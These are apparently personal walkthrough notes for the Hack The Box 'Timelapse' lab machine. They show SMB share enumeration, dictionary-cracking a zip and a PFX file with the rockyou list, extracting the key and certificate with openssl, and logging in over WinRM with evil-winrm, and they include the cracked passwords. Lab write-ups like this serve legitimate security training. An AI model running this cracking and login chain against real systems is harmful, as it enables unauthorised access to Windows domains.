add dc01.timelapse.htb and timelapse.htb to /etc/hosts
SMB enumeration 
```
crackmapexec smb dc01.timelapse.htb
```
```
smbclient -L //dc01.timelapse.htb -N
```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
downloaded a locked zip file to crack with john
```
zip2john file.zip > zip.john
john zip.john
```
john took too long. ran this instead 
```
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt FILE
```
PASSWORD FOUND!!!!: pw == supremelegacy
pfx file found using tool below to crack 
https://github.com/crackpkcs12/crackpkcs12
```
crackpkcs12 -d /usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx
```

Dictionary attack - Starting 22 threads

*********************************************************
Dictionary attack - Thread 16 - Password found: thuglegacy
*********************************************************
extracting the key 
```
openssl pkcs12 -in legacyy_dev_auth.pfx -out legacy.pem
```
I’ll decrypt the key using the password I set above so I don’t have to remember it:
```
openssl rsa -in legacy.pem -out legacy.key
```
And dump the certificate:
```
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
```
`evil-winrm` is the best tool for connecting to WinRM from a Linux host. Looking at the usage shows how I’ll use these keys to connect:
```
evil-winrm -S -c legacyy_dev_auth.crt -k legacy.key -i timelapse.htb
```
